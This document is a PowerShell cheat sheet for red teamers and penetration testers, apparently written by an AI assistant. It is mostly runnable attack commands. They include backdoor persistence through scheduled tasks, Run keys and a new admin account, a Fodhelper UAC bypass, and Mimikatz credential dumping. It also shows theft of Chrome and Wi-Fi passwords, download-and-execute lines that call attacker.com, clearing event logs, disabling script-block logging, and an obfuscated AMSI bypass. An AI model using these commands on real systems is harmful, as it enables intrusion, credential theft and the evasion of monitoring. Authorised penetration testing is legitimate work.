Here’s a **PowerShell Cheat Sheet** tailored for red team members and penetration testers, focusing on common attack vectors, enumeration techniques, and ways to evade detection.

---

### **1. Basic Information Gathering**

#### **System Information**
```powershell
Get-ComputerInfo
```

#### **List Running Processes**
```powershell
Get-Process
```

#### **Check PowerShell Version**
```powershell
$PSVersionTable.PSVersion
```

#### **Get Network Configuration**
```powershell
Get-NetIPAddress
```

#### **Get List of Installed Software**
```powershell
Get-WmiObject -Class Win32_Product
```

---

### **2. User and Group Enumeration**

#### **Get Current User**
```powershell
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
```

#### **List Local Users**
```powershell
Get-LocalUser
```

#### **Check Current User's Group Memberships**
```powershell
Get-LocalGroupMember -Group Administrators
```

#### **List Active Directory Users (Domain)**
```powershell
Get-ADUser -Filter *
```

#### **Check User Privileges**
```powershell
whoami /priv
```

---

### **3. File System Enumeration**

#### **List Files in a Directory**
```powershell
Get-ChildItem C:\path\to\directory
```

#### **Find Files with Specific Extensions**
```powershell
Get-ChildItem -Path C:\ -Recurse -Include *.config, *.xml, *.txt, *.ps1
```

#### **Search for a Specific File**
```powershell
Get-ChildItem -Recurse -Force -Filter "passwords.txt"
```

#### **Get Contents of a File**
```powershell
Get-Content C:\path\to\file.txt
```

#### **Search for Sensitive Information in Files**
```powershell
Select-String -Path C:\path\to\files\*.txt -Pattern "password"
```

---

### **4. Network Enumeration**

#### **List Network Adapters**
```powershell
Get-NetAdapter
```

#### **Check Active Connections**
```powershell
Get-NetTCPConnection | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State
```

#### **Check Open Ports**
```powershell
netstat -an
```

#### **Get DNS Cache**
```powershell
Get-DnsClientCache
```

#### **Get Network Shares**
```powershell
Get-SmbShare
```

---

### **5. Lateral Movement**

#### **Execute Command on a Remote Machine**
```powershell
Invoke-Command -ComputerName TARGET -ScriptBlock { Get-Process }
```

#### **Copy Files to a Remote Machine**
```powershell
Copy-Item -Path "C:\path\to\file.txt" -Destination "\\TARGET\C$\path\to\destination"
```

#### **Invoke PowerShell Remoting**
```powershell
Enter-PSSession -ComputerName TARGET
```

#### **WMI for Remote Command Execution**
```powershell
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName TARGET
```

#### **Run Command on Remote System (PSExec)**
```powershell
Invoke-Expression -Command "psexec.exe \\TARGET cmd.exe /c whoami"
```

---

### **6. Persistence**

#### **Create a Scheduled Task**
```powershell
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -Command "Get-Process"'
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "BackdoorTask" -Description "Persistent Backdoor"
```

#### **Add a Registry Key for Persistence**
```powershell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MyBackdoor" -Value "C:\backdoor.exe"
```

#### **Create a New Local Admin User**
```powershell
net user backdoor Password123! /add
net localgroup administrators backdoor /add
```

---

### **7. Privilege Escalation**

#### **Check Privileges**
```powershell
whoami /priv
```

#### **Check UAC Settings**
```powershell
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
```

#### **Enable Execution of Unsigned Scripts**
```powershell
Set-ExecutionPolicy Unrestricted
```

#### **Bypass PowerShell Execution Policy**
```powershell
powershell -ExecutionPolicy Bypass -File script.ps1
```

#### **UAC Bypass via Fodhelper**
```powershell
$command = 'C:\windows\system32\cmd.exe /c net localgroup administrators backdoor /add'
$regPath = 'HKCU:\Software\Classes\ms-settings\shell\open\command'
New-Item -Path $regPath -Force
Set-ItemProperty -Path $regPath -Name '(default)' -Value $command
Set-ItemProperty -Path $regPath -Name 'DelegateExecute' -Value ''
Start-Process fodhelper.exe
```

---

### **8. Credential Harvesting**

#### **Dump Cached Credentials**
```powershell
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

#### **Retrieve Saved Wi-Fi Passwords**
```powershell
(netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() } | ForEach-Object { netsh wlan show profile name="$_" key=clear }
```

#### **Extract Chrome Saved Passwords**
```powershell
$creds = @()
$DataPath = "$env:localappdata\Google\Chrome\User Data\Default\Login Data"
$Query = "SELECT action_url, username_value, password_value FROM logins"
$Connection = New-Object -ComObject ADODB.Connection
$Connection.Open("Data Source=$DataPath;Version=3;")
$RecordSet = New-Object -ComObject ADODB.Recordset
$RecordSet.Open($Query, $Connection)
while (!$RecordSet.EOF) {
    $creds += [PSCustomObject]@{
        URL = $RecordSet.Fields.Item("action_url").Value
        Username = $RecordSet.Fields.Item("username_value").Value
        Password = $RecordSet.Fields.Item("password_value").Value
    }
    $RecordSet.MoveNext()
}
$RecordSet.Close()
$Connection.Close()
$creds
```

---

### **9. Code Execution**

#### **Execute PowerShell from Memory**
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
```

#### **Run PowerShell from Base64-Encoded String**
```powershell
powershell -encodedCommand [Base64_String]
```

#### **Execute a Downloaded EXE**
```powershell
Invoke-WebRequest -Uri 'http://attacker.com/payload.exe' -OutFile 'C:\payload.exe'; Start-Process 'C:\payload.exe'
```

---

### **10. Cleansing Tracks**

#### **Delete PowerShell History**
```powershell
Remove-Item (Get-PSReadlineOption).HistorySavePath
```

#### **Clear Event Logs**
```powershell
wevtutil cl Application
wevtutil cl Security
wevtutil cl System
```

#### **Disable Logging**
```powershell
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name 'EnableScriptBlockLogging' -Value 0
```

---

### **11. Evasion Techniques**

#### **AMSI Bypass**
```powershell
sET-ItEM ( 'V'+'aR' + 'IA' + ('b'+'L')+'E:1'+('+'+''))  ( [Ref].Assemblies | ?{ $_.FullName -Match 'Amsi' }).GetType('A'+'m'+'s'+'i'+'.A'+'m'+'s'+'iU'+'t'+'i'+('l'+'S')).GetMethod('iN'+'it'+'Fa'+'il'+'u'+'r'+'e',([Type[]](0..0)) ).Invoke(0,(0..0))
```

#### **Obfuscate Command**
```powershell
$p="Start-Process";& $p calc.exe
```

#### **Encoding Payload**
```powershell
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('Invoke-WebRequest -Uri http://example.com/payload.ps1 -OutFile C:\payload.ps1; Invoke-Expression C:\payload.ps1'))
```

---

### **Key PowerShell Pentesting Tips**
- **Execution Policy Bypass**: Always check if you can bypass the execution policy on a target machine using `-ExecutionPolicy Bypass`.
- **Credential Harvesting**: Use PowerShell to extract credentials from a variety of sources like saved Wi-Fi passwords, browser passwords, or cached credentials.
- **Fileless Execution**: Execute scripts or payloads directly from memory to avoid detection by antivirus solutions.
- **Persistence**: Scheduled tasks and registry modifications are common ways to establish persistence on a compromised machine.

---
